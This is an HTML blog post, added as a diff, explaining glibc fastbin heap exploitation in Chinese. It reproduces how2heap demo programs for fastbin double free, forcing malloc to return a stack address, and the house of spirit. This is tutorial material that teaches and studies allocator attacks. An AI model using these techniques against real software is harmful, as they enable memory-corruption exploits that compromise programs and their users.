@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="背景介绍  在前一节主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:  fastbin的攻击 smallbin的攻击 largebin的攻击 unsorted bin的攻击 top chunk的攻击 本文主要介绍fastbin的攻击   fastbin漏洞利用  具体的fastbin的介绍请">
+<meta name="keywords" content="exploit,fastbin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux堆内存漏洞利用之fastbin">
+<meta property="og:url" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/index.html">
+<meta property="og:site_name" content="PCB博客">
+<meta property="og:description" content="背景介绍  在前一节主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:  fastbin的攻击 smallbin的攻击 largebin的攻击 unsorted bin的攻击 top chunk的攻击 本文主要介绍fastbin的攻击   fastbin漏洞利用  具体的fastbin的介绍请">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack_pic.png">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack.png">
+<meta property="og:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/houseofspirit.png">
+<meta property="og:updated_time" content="2018-12-23T05:33:53.013Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux堆内存漏洞利用之fastbin">
+<meta name="twitter:description" content="背景介绍  在前一节主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:  fastbin的攻击 smallbin的攻击 largebin的攻击 unsorted bin的攻击 top chunk的攻击 本文主要介绍fastbin的攻击   fastbin漏洞利用  具体的fastbin的介绍请">
+<meta name="twitter:image" content="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="PCB博客" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>linux堆内存漏洞利用之fastbin | PCB博客</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion .logo-line-before i { left: initial; }
+    .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">PCB博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">快乐记录每一天</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2017/09/24/linux堆内存漏洞利用之fastbin/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="binpang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">linux堆内存漏洞利用之fastbin
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-09-24 10:14:15" itemprop="dateCreated datePublished" datetime="2017-09-24T10:14:15+08:00">2017-09-24</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2018-12-23 13:33:53" itemprop="dateModified" datetime="2018-12-23T13:33:53+08:00">2018-12-23</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/ptmalloc/" itemprop="url" rel="index"><span itemprop="name">ptmalloc</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>  在<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="noopener">前一节</a>主要介绍了Glibc的堆内存管理的机制，在上一节的基础上，我打算介绍一下针对Glibc堆内存管理的攻击。此系列我打算按攻击面是哪一个bin来展开，主要分为:</p>
+<ul>
+<li>fastbin的攻击</li>
+<li>smallbin的攻击</li>
+<li>largebin的攻击</li>
+<li>unsorted bin的攻击</li>
+<li><p>top chunk的攻击</p>
+<p>本文主要介绍fastbin的攻击</p>
+</li>
+</ul>
+<h2 id="fastbin漏洞利用"><a href="#fastbin漏洞利用" class="headerlink" title="fastbin漏洞利用"></a>fastbin漏洞利用</h2><p>  具体的fastbin的介绍请参考<a href="http://blog.binpang.me/2017/09/22/ptmalloc%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" target="_blank" rel="noopener">前一节</a>和 <a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.36f39d7ebNe83t&amp;articleid=334" target="_blank" rel="noopener">Linux堆内存管理深入分析(下)</a>，在本节中主要结合<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a>的代码来介绍一下具体的漏洞利用思路。</p>
+<h3 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h3><p>  double free的意思就是一个malloc的指针被释放了两次，由于针对fastbin的free处理只是对double free做了简单的判断，所以很容易绕过它的double free判断。free() fastbin时的判断如下所示：</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">	   (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
+<p>  其中old指针为fast bin的头指针，即此处只是判断fastbin的头指针和p指针是否一致。所以fastbin double free的攻击思路就是我们只要保证要double free的chunk不在fastbin的头部即可。</p>
+<p>  具体的攻击示例如下：</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  在此示例中，首先申请三个大小为8的int数组，然后先free(a),由于fast bin是一个单链表，在插入和删除的时候只在头部进行，所以此时将a的chunk放入了fast bin的头部，随后又free(b),此时fast bin的头部为chunk b，随后又free(a)，此时由于fast bin的头部为chunk b，所以在free()的时候进行判断old == p不会抛出错误进而绕过这个简单的判断处理。再进行malloc的时候首先会从fast bin的头部进行删除，则接下来第一个分配的chunk为chunk A，第二个分配的为chunk B，接下来会再次分配chunk A。</p>
+<p>  绕过示例结果如下所示:</p>
+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_dup.png" alt="fast bin dup"></p>
+<h3 id="fast-bin-double-free-in-stack"><a href="#fast-bin-double-free-in-stack" class="headerlink" title="fast bin double free in stack"></a>fast bin double free in stack</h3><p>  上面的那个例子只是简单的一个double free，这个例子是利用double free漏洞在栈中构造了一个fake chunk。<br>  其具体的示例如下所示:</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  在以上代码中，当d被malloc的时候，此时还有对应的chunk a在fast bin中，所以如果对d进行修改，也会影响到chunk a的值。我们知道malloced chunk和freed chunk对应的结构不一样，对与同一个chunk A来说，有两种形式–对于d来说，其对应的是malloced chunk，而其在fast bin中还有一个freed chunk。<br>  其示例如图所示：</p>
+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack_pic.png" alt="fast bin stack pin"></p>
+<p>  可以看到<em>d(payload开始地址)正好对应了chunk A的fd指针，将 </em>d的值赋值为&amp;stack_var-8,则 stack_var=0x20即为在栈中伪造的chunk的size=0x20，与此fast bin的大小对应，此时chunk A的fd指向了在栈中伪造的chunk，此时就将伪造的chunk放入了fastbin链表中。进而malloc可以返回伪造的指针。</p>
+<p>  该示例代码的运行结果如下所示：</p>
+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/fastbin_stack.png" alt="fast bin stack"></p>
+<h3 id="The-house-of-spirit"><a href="#The-house-of-spirit" class="headerlink" title="The house of spirit"></a>The house of spirit</h3><p>  此攻击也是在栈中伪造fake chunk，和第二个攻击不同的是其只是在栈中声明了一个指针，而并没有通过malloc()函数来在堆中申请空间，接着将该指针赋值为特定的伪造的chunk的地址，随后free该指针，就将在栈中伪造的chunk添加到对应的fastbin中去了。具体的示例如下所示:</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  示例的结果如下图所示:</p>
+<p>  <img src="/2017/09/24/linux堆内存漏洞利用之fastbin/houseofspirit.png" alt="house of spirit"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"># exploit</a>
+          
+            <a href="/tags/fastbin/" rel="tag"># fastbin</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/22/ptmalloc堆内存管理/" rel="next" title="ptmalloc堆内存管理">
+                <i class="fa fa-chevron-left"></i> ptmalloc堆内存管理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/18/llvm-rdrand/" rel="prev" title="llvm生成rdrand指令">
+                llvm生成rdrand指令 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
